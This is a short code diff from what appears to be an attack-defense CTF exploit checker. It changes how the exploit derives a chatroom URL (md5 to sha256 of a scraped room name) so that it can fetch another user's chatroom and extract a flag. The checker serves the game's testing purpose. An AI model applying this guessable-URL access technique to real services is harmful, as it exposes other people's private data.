@@ -240,7 +240,7 @@ async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, clie
     if len(r.text.split('<h3>')) < 2:
         return
     roomName = r.text.split('<h3>')[1].split('</h3>')[0]
-    roomUrl = hashlib.md5(roomName.encode()).hexdigest()
+    roomUrl = hashlib.sha256(roomName.encode()).hexdigest()
     r = await client.get(f"http://{task.address + ':' + str(SERVICE_PORT)}/chatroom/{roomUrl}", cookies=cookie)
     if flag := searcher.search_flag(r.text):
         return flag
